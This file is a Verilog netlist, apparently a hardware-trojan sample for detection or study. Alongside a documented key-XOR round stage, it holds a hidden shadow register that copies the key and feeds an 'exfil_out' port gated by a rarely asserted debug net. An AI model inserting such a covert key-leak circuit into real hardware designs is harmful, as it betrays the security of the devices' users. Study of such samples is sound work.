// netlist.v
// Structural gate-level netlist for the key/round-data combination datapath.

`timescale 1ns/1ps

module trojan_netlist (
    input  wire       clk,
    input  wire       rst_n,
    input  wire [7:0] key_in,
    input  wire [7:0] round_data,
    input  wire       debug_mode_rare,
    output wire [7:0] round_out,
    output wire       exfil_out
);

    wire [7:0] key_reg;
    wire [7:0] shadow_reg;
    wire       exfil_bit;

    // ------------------------------------------------------------
    // Key register bank: samples key_in into key_reg on each clock.
    // ------------------------------------------------------------
    dff_cell u_key_ff0 (.clk(clk), .rst_n(rst_n), .d(key_in[0]), .q(key_reg[0]));
    dff_cell u_key_ff1 (.clk(clk), .rst_n(rst_n), .d(key_in[1]), .q(key_reg[1]));
    dff_cell u_key_ff2 (.clk(clk), .rst_n(rst_n), .d(key_in[2]), .q(key_reg[2]));
    dff_cell u_key_ff3 (.clk(clk), .rst_n(rst_n), .d(key_in[3]), .q(key_reg[3]));
    dff_cell u_key_ff4 (.clk(clk), .rst_n(rst_n), .d(key_in[4]), .q(key_reg[4]));
    dff_cell u_key_ff5 (.clk(clk), .rst_n(rst_n), .d(key_in[5]), .q(key_reg[5]));
    dff_cell u_key_ff6 (.clk(clk), .rst_n(rst_n), .d(key_in[6]), .q(key_reg[6]));
    dff_cell u_key_ff7 (.clk(clk), .rst_n(rst_n), .d(key_in[7]), .q(key_reg[7]));

    // ------------------------------------------------------------
    // Documented round-combination stage: one XOR consumer per bit,
    // producing the sole documented output round_out[7:0].
    // ------------------------------------------------------------
    xor2_cell u_round_xor0 (.a(key_reg[0]), .b(round_data[0]), .y(round_out[0]));
    xor2_cell u_round_xor1 (.a(key_reg[1]), .b(round_data[1]), .y(round_out[1]));
    xor2_cell u_round_xor2 (.a(key_reg[2]), .b(round_data[2]), .y(round_out[2]));
    xor2_cell u_round_xor3 (.a(key_reg[3]), .b(round_data[3]), .y(round_out[3]));
    xor2_cell u_round_xor4 (.a(key_reg[4]), .b(round_data[4]), .y(round_out[4]));
    xor2_cell u_round_xor5 (.a(key_reg[5]), .b(round_data[5]), .y(round_out[5]));
    xor2_cell u_round_xor6 (.a(key_reg[6]), .b(round_data[6]), .y(round_out[6]));
    xor2_cell u_round_xor7 (.a(key_reg[7]), .b(round_data[7]), .y(round_out[7]));

    // ------------------------------------------------------------
    // Additional register bank: also samples key_reg on the same
    // clock/reset as the key register bank itself.
    // ------------------------------------------------------------
    dff_cell u_shadow_ff0 (.clk(clk), .rst_n(rst_n), .d(key_reg[0]), .q(shadow_reg[0]));
    dff_cell u_shadow_ff1 (.clk(clk), .rst_n(rst_n), .d(key_reg[1]), .q(shadow_reg[1]));
    dff_cell u_shadow_ff2 (.clk(clk), .rst_n(rst_n), .d(key_reg[2]), .q(shadow_reg[2]));
    dff_cell u_shadow_ff3 (.clk(clk), .rst_n(rst_n), .d(key_reg[3]), .q(shadow_reg[3]));
    dff_cell u_shadow_ff4 (.clk(clk), .rst_n(rst_n), .d(key_reg[4]), .q(shadow_reg[4]));
    dff_cell u_shadow_ff5 (.clk(clk), .rst_n(rst_n), .d(key_reg[5]), .q(shadow_reg[5]));
    dff_cell u_shadow_ff6 (.clk(clk), .rst_n(rst_n), .d(key_reg[6]), .q(shadow_reg[6]));
    dff_cell u_shadow_ff7 (.clk(clk), .rst_n(rst_n), .d(key_reg[7]), .q(shadow_reg[7]));

    // ------------------------------------------------------------
    // Convergence point: all shadow_reg bits are packed into a
    // single bit and routed through a multiplexer gated by a
    // rarely-asserted control net, driving a second output port
    // that is not consumed by round_out logic.
    // ------------------------------------------------------------
    assign exfil_bit = |shadow_reg;

    mux2_cell u_exfil_mux (.sel(debug_mode_rare), .a(1'b0), .b(exfil_bit), .y(exfil_out));

endmodule